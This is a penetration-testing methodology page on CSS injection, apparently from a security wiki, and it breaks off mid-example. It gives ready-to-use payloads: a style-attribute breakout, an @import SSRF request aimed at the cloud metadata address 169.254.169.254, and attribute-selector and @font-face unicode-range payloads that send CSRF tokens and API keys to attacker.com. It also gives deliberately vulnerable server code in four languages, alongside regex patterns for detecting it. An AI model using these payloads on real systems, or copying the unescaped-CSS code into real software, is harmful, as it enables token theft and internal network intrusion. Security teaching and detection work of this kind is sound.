# CSS Injection

## Check List

## Methodology

### Black Box

#### Country Parameter

{% stepper %}
{% step %}
Log into the target site and intercept requests using the Bupr Suite tool
{% endstep %}

{% step %}
Then examine the requests and look for the `country` parameter, as shown below

```url
https://example.com/search?q=a&country=BR
```
{% endstep %}

{% step %}
In the request, modify the country parameter to a random value and observe its reflection in a style attribute like this

```html
<div class="language" style="background-image: url(/BR.svg)"><div>
```
{% endstep %}

{% step %}
If the parameter value was inside a `(..)` we can escape using the `;` character and write a new style and send the following malicious request

```css
https://example.com/search?q=a&country=BR'); width: 9999px; height: 9999px; background: red; //
```
{% endstep %}

{% step %}
And if the page changes, it is confirmed to be vulnerable and displayed in the html as follows

```html
<div class="language" style="background-image: url(/BR.svg'); width: 9999px; height: 9999px; background: red; //)"><div>
```
{% endstep %}
{% endstepper %}

***

#### Base CSS injection

{% stepper %}
{% step %}
Access the target application
{% endstep %}

{% step %}
Navigate to the target page by clicking the relevant button
{% endstep %}

{% step %}
Observe the `HTTP GET` for `/Home/TargetPage`, and inspect the rendered form where the user can change “Color” and “Tag” of a text in that page
{% endstep %}

{% step %}
Submit the form with benign inputs `(Color = “green”, Tag = “h3”`) and inspect the HTTP POST to `/Home/TargetPage`. Confirm that the submitted values are reflected in the response HTML
{% endstep %}

{% step %}
Test for injection by providing a payload like Test for injection by providing a payload like `"><h1>CSSInjection` in the Color and Tag fields. Observe that the Color field is used without validation, whereas Tag input is validated
{% endstep %}

{% step %}
Refine the payload to something like `\" onclick=prompt(8)>` in the Color field to verify reflective XSS within the CSS context or style attribute
{% endstep %}

{% step %}
Exploit the CSS injection, inject attacker‑controlled `CSS` via the `Color` or `style` field and observe its effect on page rendering (`overriding styles`, `altering visual appearance`)
{% endstep %}
{% endstepper %}

***

#### Potential XSS

{% stepper %}
{% step %}
Identify the target resource and confirm that this URL accepts user-controlled input that could potentially lead to CSS injection. The test could be like this

```url
https://example.com/landings/libs/alert/alerts/exitpopup74/exit-popup.php?root=https://+YOUR SERVER+/&lang=en
```
{% endstep %}

{% step %}
On the attacker’s server, create the exit-popup.css file and insert the following code to test the CSS injection

```html
div {
 background-image: url("https://media.giphy.com/media/SggILpMXO7Xt6/giphy.gif");
 background-color: #cccccc;
}
```
{% endstep %}

{% step %}
Observe whether custom CSS is applied or reflected back — check for injected styles altering page rendering
{% endstep %}
{% endstepper %}

***

### White Box

#### Internal Network Reconnaissance via Headless Render CSS @import Directives

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise features that generate asynchronous static artifacts from dynamic user data (e.g., exporting Monthly Financial Invoices, generating PDF Compliance Reports, or archiving chat logs)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind.
{% endstep %}

{% step %}
Decompile or reverse engineer the application's document rendering pipeline.
{% endstep %}

{% step %}
Identify the "Headless Rendering" architecture. Generating pixel-perfect PDFs utilizing legacy, server-side PDF libraries (like iText or TCPDF) is notoriously difficult when matching modern frontend CSS layouts.
{% endstep %}

{% step %}
Investigate the rendering optimization. To ensure the generated PDF looks exactly like the web dashboard, backend engineers deploy a microservice running a Headless Browser (e.g., Puppeteer, Playwright, or wkhtmltopdf). The API aggregates the raw HTML and CSS from the database, feeds it to the Headless Browser, captures a screenshot or PDF buffer, and returns it to the user
{% endstep %}

{% step %}
Analyze the input sanitization pipeline. The developer strictly applies HTML sanitization (stripping `<script>`, `<iframe>`, and event handlers) to the user's data before sending it to the rendering engine, preventing the Headless Browser from executing JavaScript-based Server-Side Request Forgery (SSRF)
{% endstep %}

{% step %}
Discover the fatal boundary oversight: The developer assumes that because JavaScript is neutralized, the remaining HTML and CSS are purely structural and inert. They explicitly permit `<style>` tags or custom CSS payloads to allow tenants to brand their invoices (e.g., defining primary colors or uploading a company logo)
{% endstep %}

{% step %}
Understand the CSS engine network capabilities: The CSS specification natively supports fetching external resources to construct the rendering tree. Directives such as `@import url(...)`, `background-image: url(...)`, and `@font-face` instruct the browser's rendering engine to actively issue HTTP `GET` requests
{% endstep %}

{% step %}
Formulate the Headless SSRF payload. You must construct a CSS payload that forces the isolated backend rendering pod to issue HTTP requests against the internal network
{% endstep %}

{% step %}
Formulate the Headless SSRF payload. You must construct a CSS payload that forces the isolated backend rendering pod to issue HTTP requests against the internal network
{% endstep %}

{% step %}
Submit the malicious CSS payload via the Tenant Branding or Invoice Customization settings
{% endstep %}

{% step %}
Trigger the PDF generation endpoint (e.g., `GET /api/v1/invoices/INV-100/export`)
{% endstep %}

{% step %}
The backend compiles the sanitized HTML and your malicious CSS, passing the document to the Headless Browser microservice
{% endstep %}

{% step %}
The Headless Browser parses the CSS to construct the CSSOM (CSS Object Model). It encounters the `@import` or `url()` directive
{% endstep %}

{% step %}
Operating deep within the trusted internal network, the headless browser executes the outbound HTTP `GET` request. Because the browser natively resolves redirects and fetches resources, the attacker achieves a powerful, zero-JS Blind SSRF, weaponizing the application's CSS layout engine to map internal topologies and trigger state-changing internal `GET` endpoints

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(new\s+HtmlToPdfDocument\s*\(\s*\))|(HtmlToPdfDocument\s*\()|(PdfRendererBuilder\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regexp
(new\s+PdfRendererBuilder\s*\(\s*\))|(PdfRendererBuilder\s+\w+\s*=\s*new\s+PdfRendererBuilder)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$snappy\s*=\s*new\s+Pdf\s*\(\s*\))|(\$snappy\s*->(generateFromHtml|generate|setOption))|(Knp\\Snappy\\Pdf)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(puppeteer\.launch\s*\()|(puppeteer\.createBrowserFetcher\s*\()|(page\.pdf\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
new\s+HtmlToPdfDocument\(\)|HtmlToPdfDocument\(|PdfRendererBuilder\(
```
{% endtab %}

{% tab title="Java" %}
```regexp
new\s+PdfRendererBuilder\(\)|PdfRendererBuilder\s+\w+
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$snappy\s*=\s*new\s+Pdf\(|Knp\\Snappy\\Pdf|generateFromHtml
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
puppeteer\.launch|page\.pdf\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class InvoiceExportService
{
    private readonly IConverter _pdfConverter;

    public InvoiceExportService(IConverter pdfConverter)
    {
        _pdfConverter = pdfConverter;
    }

    public byte[] GeneratePdf(string invoiceHtml, string tenantCustomCss)
    {
        // [1]
        // [2]
        // [3]
        // [4]
        var document = new HtmlToPdfDocument()
        {
            GlobalSettings = { ColorMode = ColorMode.Color, PaperSize = PaperKind.A4 },
            Objects = {
                new ObjectSettings() {
                    HtmlContent = $"<html><head><style>{tenantCustomCss}</style></head><body>{invoiceHtml}</body></html>",
                    WebSettings = { DefaultEncoding = "utf-8" }
                }
            }
        };

        // wkhtmltopdf engine fetches all CSS-defined URLs before rendering
        return _pdfConverter.Convert(document);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class InvoiceExportService {

    public byte[] generatePdf(String invoiceHtml, String tenantCustomCss) throws Exception {
        ByteArrayOutputStream os = new ByteArrayOutputStream();

        // [1]
        // [2]
        // [3]
        // [4]
        String document = "<html><head><style>" + tenantCustomCss + "</style></head><body>" + invoiceHtml + "</body></html>";

        PdfRendererBuilder builder = new PdfRendererBuilder();
        builder.useFastMode();
        // The renderer executes network calls to resolve CSS assets
        builder.withHtmlContent(document, "http://internal-base-url.local/");
        builder.toStream(os);
        builder.run();

        return os.toByteArray();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class InvoiceExportService
{
    public function generatePdf($invoiceHtml, $tenantCustomCss)
    {
        // [1]
        // [2]
        $snappy = new \Knp\Snappy\Pdf('/usr/local/bin/wkhtmltopdf');

        // [3]
        // [4]
        $document = "<html><head><style>{$tenantCustomCss}</style></head><body>{$invoiceHtml}</body></html>";

        // Generates the PDF, resolving all CSS imports and URLs via the internal network interface
        return $snappy->getOutputFromHtml($document);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const puppeteer = require('puppeteer');

class InvoiceExportService {
    static async generatePdf(invoiceHtml, tenantCustomCss) {
        // [1]
        // [2]
        // Utilizing a headless browser to ensure perfect CSS rendering
        const browser = await puppeteer.launch({ args: ['--no-sandbox'] });
        const page = await browser.newPage();

        // [3]
        // [4]
        // The developer relies on a prior HTML sanitization step to strip <script> tags.
        // However, the raw CSS is injected directly into the document head.
        const document = `
            <html>
            <head>
                <style>${tenantCustomCss}</style>
            </head>
            <body>${invoiceHtml}</body>
            </html>
        `;

        // The browser engine parses the DOM and CSSOM, executing any CSS url() 
        // or @import directives originating from the internal network container.
        await page.setContent(document, { waitUntil: 'networkidle0' });
        
        const pdfBuffer = await page.pdf({ format: 'A4' });
        await browser.close();

        return pdfBuffer;
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture processes high-fidelity static document generation (PDFs/Images) by offloading the rendering process to an internal Headless Browser microservice, \[2] To support white-labeling, the platform allows tenants to define custom CSS rules (e.g., fonts, background colors) to be injected into the PDF templates, \[3] The security boundary assumes that rendering engines only pose a threat if JavaScript is executed. Developers aggressively sanitize the HTML to neutralize `<script>` tags but implicitly trust the CSS string, \[4] The execution sink. The CSS specification requires the rendering engine to autonomously fetch external assets (fonts, background images, imported stylesheets) to calculate the final layout. When the attacker injects an `@import` or `url()` directive pointing to an internal IP address, the Headless Browser obediently executes the HTTP `GET` request. Because the browser operates within the trusted backend cluster, this CSS evaluation blindly bypasses all external firewall rules, resulting in a robust, JavaScript-free Server-Side Request Forgery

```http
// 1. Attacker navigates to the Tenant Configuration dashboard.
// 2. Attacker injects a malicious CSS payload into the "Custom Invoice CSS" field.

POST /api/v1/tenant/branding HTTP/1.1
Host: admin.enterprise.tld
Authorization: Bearer <tenant_admin_token>
Content-Type: application/json

{
  "logoUrl": "https://example.com/logo.png",
  "customCss": "body { background-color: #fff; } @import url('http://169.254.169.254/latest/meta-data/');"
}

// 3. The backend saves the CSS to the database.
// 4. The attacker requests a PDF export of a recent invoice.

GET /api/v1/invoices/INV-99123/export HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <tenant_admin_token>

// 5. The backend initiates the Headless Browser, injecting the attacker's CSS into the <style> tag.
// 6. The Headless Browser parses the CSS and immediately fires an HTTP GET to the AWS Metadata IP.
// 7. (Blind SSRF achieved). If the rendering engine's error logs are verbose, or if the metadata 
//    returns valid CSS-parsable text that alters the document layout, the attacker can extract the 
//    results visually from the generated PDF.
```
{% endstep %}

{% step %}
To ensure absolute layout fidelity when converting web content into static artifacts (PDFs), enterprise architects deployed Headless Browser microservices. This optimization shifted rendering responsibility from the client's device to the internal backend infrastructure. The security posture incorrectly equated scripting execution (JavaScript) with absolute systemic risk, completely ignoring the active networking capabilities embedded within the CSS rendering specification. Developers explicitly authorized custom CSS to support white-labeling requirements. The attacker weaponized this trust by injecting native CSS networking directives (`@import`, `url()`) targeting highly classified internal IP addresses. When the backend rendering engine constructed the CSSOM, it autonomously executed outbound HTTP requests into the protected service mesh to resolve the requested assets, successfully transforming a benign styling feature into a fully automated, internal network reconnaissance and SSRF proxy
{% endstep %}
{% endstepper %}

***

#### Global Exfiltration via CSS Variable Deserialization Escaping in Server-Side Rendering (SSR)

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on high-performance Frontend architectures utilizing Server-Side Rendering (SSR) frameworks (e.g., Next.js, Nuxt.js, Blazor) coupled with dynamic theming
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the frontend state hydration and CSS-in-JS injection sequence
{% endstep %}

{% step %}
Identify the "FOUC Prevention" architecture. In React/Vue SSR applications, rendering the page without CSS causes a "Flash of Unstyled Content" (FOUC). To prevent this, the backend server evaluates the component tree, extracts all required CSS styles, and physically injects them into a global `<style>` tag within the HTML `<head>` before dispatching the response to the client
{% endstep %}

{% step %}
Investigate the Dynamic Theming optimization. The platform allows users to define custom UI preferences (e.g., a "Profile Accent Color"). To inject this preference into the application globally, the backend retrieves the color string from the database and interpolates it directly into a CSS Custom Property (CSS Variable) within the SSR `<style>` block (e.g., `:root { --primary-color: #ff0000; }`)
{% endstep %}

{% step %}
Analyze the sanitization context. The backend framework (e.g., React `dangerouslySetInnerHTML`, Blade, or Razor) automatically HTML-encodes data placed _inside_ standard HTML tags (`<div>`). However, data placed inside a `<style>` block requires context-aware CSS escaping
{% endstep %}

{% step %}
Discover the fatal interpolation flaw: Developers frequently interpolate user-controlled variables directly into the CSS string without applying CSS-specific escaping (e.g., hex-encoding characters). They mistakenly believe that restricting the input field in the UI (e.g., using an HTML `<input type="color">`) guarantees the data is a safe hexadecimal string
{% endstep %}

{% step %}
Understand the Global Pollution vulnerability: By breaking out of the CSS variable definition (injecting `}`), an attacker can append entirely new CSS rules to the global stylesheet. Because this stylesheet sits in the `<head>`, the injected rules apply globally across the entire DOM tree
{% endstep %}

{% step %}
Formulate the Data Exfiltration payload. Because you can write global CSS, you can utilize CSS Attribute Selectors to conditionally load background images based on the presence of hidden DOM values (e.g., `<input type="hidden" name="csrf_token" value="secret123">`)
{% endstep %}

{% step %}
Construct a CSS Keylogger / Exfiltration payload

```css
#fff; }
input[name=csrf_token][value^=a] { background-image: url(https://attacker.com/leak?c=a); }
input[name=csrf_token][value^=b] { background-image: url(https://attacker.com/leak?c=b); }
```
{% endstep %}

{% step %}
Submit the payload via the API, bypassing the frontend UI restrictions, to update your "Profile Accent Color"
{% endstep %}

{% step %}
The backend stores the payload in the database
{% endstep %}

{% step %}
An enterprise administrator navigates to a dashboard that renders your profile (or a shared workspace rendering your theme)
{% endstep %}

{% step %}
The SSR Server retrieves your payload and interpolates it directly into the `<head>` style block: `<style>`
{% endstep %}

{% step %}
The administrator's browser renders the HTML. The global CSS rules immediately evaluate the DOM. If the hidden CSRF token begins with the letter `a`, the browser executes an HTTP request to the attacker's server. By chaining selectors, the attacker blindly extracts highly classified DOM state (CSRF tokens, OAuth nonces, Personal Data) without executing a single line of JavaScript.

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(Html\.Raw\(\s*\$"<style>:root\s*\{\s*--[a-zA-Z0-9_-]+\s*:\s*\{)|(Html\.Raw\(.*--[a-zA-Z0-9_-]+.*\{)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(out\.println\(\s*"<style>:root\s*\{\s*--[a-zA-Z0-9_-]+\s*:\s*"\s*\+\s*)|(String.*"<style>.*--.*:\s*"\s*\+)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(echo\s*"<style>:root\s*\{\s*--[a-zA-Z0-9_-]+\s*:\s*\{\$)|(echo.*--[a-zA-Z0-9_-]+.*\$\w+)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(<style\s+dangerouslySetInnerHTML=\{\{\s*__html:.*:root\s*\{\s*--[a-zA-Z0-9_-]+\s*:\s*\$\{)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Html\.Raw\(\$"<style>:root.*--[a-zA-Z0-9_-]+:
```
{% endtab %}

{% tab title="Java" %}
```regexp
out\.println\("<style>:root\s*\{\s*--[a-zA-Z0-9_-]+:\s*"\s*\+
```
{% endtab %}

{% tab title="PHP" %}
```regexp
echo\s*"<style>:root.*--[a-zA-Z0-9_-]+:\s*\$\{
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
dangerouslySetInnerHTML=.*--[a-zA-Z0-9_-]+\s*:\s*\$\{
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
@model UserProfileViewModel

<head>
    <!-- [1] -->
    <!-- [2] -->
    <!-- [3] -->
    <!-- [4] -->
    <!-- Html.Raw disables ASP.NET's native HTML encoding. The developer applies this 
         to prevent the CSS braces and colons from being HTML-encoded, inadvertently 
         exposing the interpolation block to CSS Injection. -->
    @Html.Raw($"<style>:root {{ --user-accent: {Model.ProfileColor}; }}</style>")
</head>
<body>
    @Html.AntiForgeryToken()
    <div class="user-content">...</div>
</body>
```
{% endtab %}

{% tab title="Java" %}
```java
<head>
    <!-- [1] -->
    <!-- [2] -->
    <!-- [3] -->
    <!-- [4] -->
    <!-- Thymeleaf's th:utext (Unescaped Text) pushes the raw variable into the style block -->
    <style th:utext="':root { --user-accent: ' + ${user.profileColor} + '; }'"></style>
</head>
<body>
    <input type="hidden" name="_csrf" th:value="${_csrf.token}" />
    <!-- ... -->
</body>
```
{% endtab %}

{% tab title="PHP" %}
```php
<head>
    <!-- [1] -->
    <!-- [2] -->
    <!-- [3] -->
    <!-- [4] -->
    <!-- {!! !!} syntax in Laravel Blade skips htmlspecialchars() -->
    <style>
        :root {
            --user-accent: {!! $user->profile_color !!};
        }
    </style>
</head>
<body>
    @csrf
    <!-- ... -->
</body>
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
export default function UserProfile({ user }) {
    // [1]
    // [2]
    // React inherently escapes HTML, but dangerouslySetInnerHTML bypasses it entirely.
    // The developer assumes user.profileColor is a safe hex string because the 
    // frontend validation enforces a color picker UI.
    const globalStyles = `
        :root {
            --user-accent: ${user.profileColor};
        }
    `;

    return (
        <html>
            <head>
                {/* [3] */}
                {/* [4] */}
                {/* Injects the unescaped CSS payload directly into the global DOM context */}
                <style dangerouslySetInnerHTML={{ __html: globalStyles }} />
            </head>
            <body>
                <input type="hidden" name="admin_csrf" value="SUPER_SECRET_TOKEN" />
                <Dashboard content={user.bio} />
            </body>
        </html>
    );
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture employs Server-Side Rendering (SSR) to compile CSS-in-JS or dynamic themes prior to serving the HTML, eliminating initial visual rendering latency (FOUC), \[2] To apply dynamic user preferences globally across all UI components, the developer targets the `:root` pseudo-class, defining CSS Custom Properties (CSS Variables), \[3] Modern web frameworks (React, Blade, Razor) safely HTML-encode variables by default. However, HTML-encoding CSS logic destroys the CSS syntax. To force the browser to render the styles, the developer explicitly disables the framework's contextual escaping (e.g., `dangerouslySetInnerHTML`, `Html.Raw`), \[4] The execution sink. The developer treats the database input as a mathematically safe string (e.g., a hex code), failing to sanitize it for CSS boundary characters (like `;` and `}`). The attacker submits a payload that closes the CSS variable declaration and initiates entirely new, globally scoped CSS rules. The SSR server blindly interpolates this payload into the `<head>`, weaponizing the browser's CSS evaluation engine to scan the DOM and silently exfiltrate hidden attributes via conditional background image requests

```http
// 1. Attacker bypasses the frontend "Color Picker" UI and intercepts the profile update API call.
// 2. Attacker crafts a CSS payload designed to leak the first character of a hidden CSRF token 
//    rendered on the administrative dashboard.

POST /api/v1/profile/settings HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "profileColor": "#ffffff; } input[name=admin_csrf][value^=a] { background: url(https://attacker.com/leak?c=a); } input[name=admin_csrf][value^=b] { background: url(https://attacker.com/leak?c=b); "
}

// 3. The backend stores the payload as a string.
// 4. An Administrator views the attacker's profile or a shared workspace utilizing the attacker's theme.
// 5. The SSR engine constructs the HTML:

<head>
    <style>
        :root {
            --user-accent: #ffffff; } 
            input[name=admin_csrf][value^=a] { background: url(https://attacker.com/leak?c=a); } 
            input[name=admin_csrf][value^=b] { background: url(https://attacker.com/leak?c=b); 
        }
    </style>
</head>
<body>
    <input type="hidden" name="admin_csrf" value="b9f8e1..." />
</body>

// 6. The Admin's browser renders the HTML and evaluates the global CSS.
// 7. The CSS engine detects that the hidden input's value begins with 'b'.
// 8. The browser executes an HTTP GET request to `https://attacker.com/leak?c=b`.
// 9. The attacker receives the request, successfully exfiltrating the first character of the CSRF token.
// 10. The attacker repeats the payload, incrementally shifting the prefix string (value^=ba, value^=bb) 
//     until the entire token is extracted.
```
{% endstep %}

{% step %}
To ensure performant, flicker-free rendering of highly dynamic UI themes, frontend architects mandated Server-Side Rendering (SSR) of user-defined CSS Custom Properties. This optimization required bypassing the web framework's native HTML context escaping algorithms to ensure the CSS syntax remained executable. The security vulnerability materialized from an input validation gap regarding protocol-specific encapsulation. Developers assumed that frontend UI constraints (e.g., color pickers) guaranteed the structural integrity of backend storage payloads. The attacker circumvented the UI, injecting CSS termination characters (`; }`) alongside fully autonomous attribute selectors into the raw API payload. The SSR engine dutifully interpolated the payload into the global `<style>` block. Upon delivery, the browser's CSS evaluation engine parsed the global rules, systematically scanning the DOM against the attacker's conditional matrices, and seamlessly exfiltrated protected state variables via out-of-band asset requests, completely bypassing standard JavaScript execution constraints
{% endstep %}
{% endstepper %}

***

#### Character-Set Leakage via @font-face unicode-range Delineation Oracles

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise document generators, specialized Markdown/Rich-Text editors, or multi-tenant portals that enforce extremely strict Content Security Policies (CSP)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application's Content Security Policy (CSP) and allowed HTML parameters
{% endstep %}

{% step %}
Identify the "Zero-JS / Strict CSP" architecture. The enterprise protects highly sensitive pages (e.g., a vault displaying a user's recovery codes or an administrative grid displaying API keys) by enforcing a draconian CSP: `default-src 'self'; script-src 'none'; img-src 'none'; connect-src 'none'`&#x20;
{% endstep %}

{% step %}
Investigate the Design System exemptions. To satisfy enterprise design requirements and support dynamic typography (e.g., Google Fonts or custom corporate fonts), the security architects explicitly grant an exemption within the CSP: `font-src *` and `style-src 'unsafe-inline'` (or permit CSS upload)
{% endstep %}

{% step %}
Analyze the CSS engine's typographic optimization mechanics. When a browser encounters an `@font-face` declaration containing a `unicode-range` attribute (e.g., `unicode-range: U+0041;` for the letter 'A'), the browser performs extreme network optimization. The browser will _only_ dispatch the HTTP request to download the font file if the target character actually exists within the rendered DOM
{% endstep %}

{% step %}
Discover the fatal execution pathway: An attacker cannot use CSS attribute selectors to leak data because `img-src 'none'` blocks the `background-image: url(...)` exfiltration request. However, `font-src *` is explicitly allowed. By declaring custom fonts for specific characters, the attacker can leverage the browser's own typographic engine as a blind data extraction oracle
{% endstep %}

{% step %}
Understand the vulnerability: If an attacker can inject custom CSS (via a vulnerable styling field, a multi-tenant theme upload, or an un-sanitized `<style>` tag in a rich-text editor), they can define hundreds of distinct `@font-face` rules. Each rule targets a specific character in the alphabet and points to a unique tracking URL on the attacker's server
{% endstep %}

{% step %}
Formulate the Font-Ligature Timing Oracle payload

```http
@font-face { font-family: "Leak"; src: url("https://attacker.com/leak?char=A"); unicode-range: U+0041; }
@font-face { font-family: "Leak"; src: url("https://attacker.com/leak?char=B"); unicode-range: U+0042; }
/* ... repeat for [a-zA-Z0-9] ... */

/* Apply the font to the target element containing the secret */
.secret-api-key { font-family: "Leak", monospace; }
```
{% endstep %}

{% step %}
Inject the CSS payload into the application (e.g., updating a tenant's CSS theme file)
{% endstep %}

{% step %}
Lure a victim (or an Administrator) to view the page containing the highly sensitive data (e.g., the `.secret-api-key` element) where the custom theme is active
{% endstep %}

{% step %}
The browser renders the HTML and applies the strict CSP. Scripts are blocked. Images are blocked. XHR is blocked
{% endstep %}

{% step %}
The browser applies the CSS. It evaluates the `.secret-api-key` element, which contains the string "BADC0DE"
{% endstep %}

{% step %}
To render the text, the typographic engine evaluates the `@font-face` declarations. Optimizing for network performance, it analyzes the DOM text ("BADC0DE") against the `unicode-range` rules
{% endstep %}

{% step %}
The browser natively executes HTTP `GET` requests to the `font-src` endpoints specifically for the characters 'B', 'A', 'D', 'C', '0', and 'E'. The attacker receives the exact unordered character set of the secret API key. By chaining this technique with font ligatures or sequential `unicode-range` mappings, the attacker can deduce the precise string structure, executing high-fidelity data exfiltration while perfectly complying with the enterprise's draconian Content Security Policy

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(HtmlSanitizer\.AllowedTags\.Add\(\s*["']style["']\s*\))|(AllowedTags\.Add\(.*style)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(policy\.allowElements\(\s*["']style["']\s*\))|(allowElements\(.*style)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$config->set\(\s*['"]HTML\.Allowed['"]\s*,\s*['"].*style.*['"]\s*\))|(\$config->.*Allowed.*style)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(sanitizeHtml\(.*allowedTags:\s*\[.*['"]style['"].*\])|(sanitizeHtml\(.*style)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
HtmlSanitizer\.AllowedTags\.Add\("style"\)
```
{% endtab %}

{% tab title="Java" %}
```regexp
policy\.allowElements\("style"\)|allowElements\(.*style
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$config->set\('HTML\.Allowed',.*style.*\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
sanitizeHtml\(.*allowedTags:\s*\[.*['"]style['"].*\]
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class ThemeController : ControllerBase
{
    [HttpPost("/api/v1/tenant/theme")]
    public async Task<IActionResult> UpdateTheme([FromBody] UpdateThemeRequest request)
    {
        var sanitizer = new HtmlSanitizer();
        
        // [1]
        // [2]
        sanitizer.AllowedTags.Add("div");
        sanitizer.AllowedTags.Add("span");
        
        // [3]
        // [4]
        // The developer allows <style> blocks, relying entirely on the CSP header
        // "default-src 'self'; font-src *;" to prevent malicious data exfiltration.
        sanitizer.AllowedTags.Add("style");

        var safeHtml = sanitizer.Sanitize(request.ThemeHtml);

        var config = await _dbContext.TenantConfigs.FindAsync(User.GetTenantId());
        config.ThemeHtml = safeHtml;
        await _dbContext.SaveChangesAsync();

        return Ok();
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class ThemeSanitizer {

    // [1]
    // [2]
    private final PolicyFactory policy = new HtmlPolicyBuilder()
            .allowElements("div", "span", "p", "b", "i")
            // [3]
            // [4]
            // Permits inline styling directives, trusting the CSP 
            // to restrict outbound network connections.
            .allowElements("style")
            .allowAttributes("class", "id").globally()
            .toFactory();

    public String sanitize(String rawHtml) {
        return policy.sanitize(rawHtml);
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class ThemeController extends Controller
{
    public function updateTheme(Request $request)
    {
        $config = \HTMLPurifier_Config::createDefault();
        
        // [1]
        // [2]
        // [3]
        // [4]
        // HTMLPurifier can be configured to permit safe CSS tags.
        // It scrubs invalid CSS rules, but @font-face is technically valid CSS.
        $config->set('HTML.Allowed', 'style,div[class|id],span[class|id],p');
        $config->set('CSS.AllowTricky', true); // Often enabled for advanced theming
        
        $purifier = new \HTMLPurifier($config);
        $safeHtml = $purifier->purify($request->input('themeHtml'));

        $tenant = auth()->user()->tenant;
        $tenant->theme_html = $safeHtml;
        $tenant->save();

        return response()->json(['status' => 'Updated']);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const sanitizeHtml = require('sanitize-html');

router.post('/api/v1/tenant/theme', async (req, res) => {
    // [1]
    // [2]
    // Developer aggressively strips scripts and iframes to prevent XSS.
    // However, they explicitly permit <style> tags to allow dynamic, 
    // multi-tenant white-labeling in the browser.
    let safeTheme = sanitizeHtml(req.body.themeHtml, {
        // [3]
        // [4]
        // Permitting <style> is assumed safe because the platform enforces a strict
        // Content Security Policy (CSP) blocking external images and scripts.
        allowedTags: ['b', 'i', 'em', 'strong', 'a', 'style', 'div', 'span'],
        allowedAttributes: {
            'a': ['href'],
            '*': ['class', 'id']
        }
    });

    await TenantConfig.update({ theme: safeTheme }, { where: { id: req.user.tenantId } });
    res.send({ status: 'Updated' });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The application architecture must support extreme layout customizability (e.g., bespoke corporate portals, customized ticket views), requiring the backend to accept and render user-provided HTML and CSS, \[2] To eliminate JavaScript-based Cross-Site Scripting, the architecture funnels all input through a robust HTML Sanitizer, \[3] The security model relies on a Defense-in-Depth strategy. Developers explicitly allow the `<style>` tag, operating under the assumption that even if CSS Injection occurs, the platform's draconian Content Security Policy (`script-src 'none'; img-src 'none'; connect-src 'none'`) mathematically prevents data exfiltration, \[4] The execution paradox. To support modern UI typography, the CSP explicitly whitelists external font loading (`font-src *`). The developers equated typography with inert styling assets. They failed to account for the browser's deep optimization of network resources. By mapping individual Unicode characters to distinct external font URLs, the attacker leverages the browser's own typographic engine to evaluate the DOM state. The browser autonomously transmits HTTP `GET` requests strictly for the characters present within the targeted DOM node, providing a covert, highly resilient data exfiltration channel that effortlessly bypasses the application's strict CSP envelope

```http
// 1. Attacker controls a multi-tenant workspace and intercepts the theme update request.
// 2. Attacker crafts a CSS payload mapping distinct characters to distinct URLs via unicode-range.
// 3. The attacker applies this custom font specifically to the DOM element containing the targeted secret.

POST /api/v1/tenant/theme HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "themeHtml": "<style> @font-face { font-family: 'Exfil'; src: url('https://attacker.com/leak?c=a'); unicode-range: U+0061; } @font-face { font-family: 'Exfil'; src: url('https://attacker.com/leak?c=b'); unicode-range: U+0062; } /* ... */ input[name='api_key'] { font-family: 'Exfil', monospace; } </style>"
}

// 4. The HTML Sanitizer validates the <style> tag. The payload is stored in the database.
// 5. A Super Administrator navigates to the workspace settings page.
// 6. The backend returns the HTML containing the Super Admin's API key: 
//    <input type="text" name="api_key" value="ab" />

// 7. The Admin's browser applies the strict CSP:
